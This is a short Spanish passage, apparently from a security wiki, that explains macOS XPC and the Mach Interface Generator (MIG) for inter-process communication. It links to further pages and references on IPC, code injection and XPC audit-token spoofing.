XPC, que significa XNU (el núcleo utilizado por macOS) inter-Process Communication, es un marco para **la comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas a métodos seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, permitiendo la **creación de aplicaciones con privilegios separados** donde cada **componente** se ejecuta con **solo los permisos que necesita** para hacer su trabajo, limitando así el daño potencial de un proceso comprometido.

Para más información sobre cómo funciona esta **comunicación** y cómo **podría ser vulnerable**, consulta:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Generador de Interfaz Mach

MIG fue creado para **simplificar el proceso de creación de código Mach IPC**. Básicamente, **genera el código necesario** para que el servidor y el cliente se comuniquen con una definición dada. Incluso si el código generado es feo, un desarrollador solo necesitará importarlo y su código será mucho más simple que antes.

Para más información, consulta:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## Referencias

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
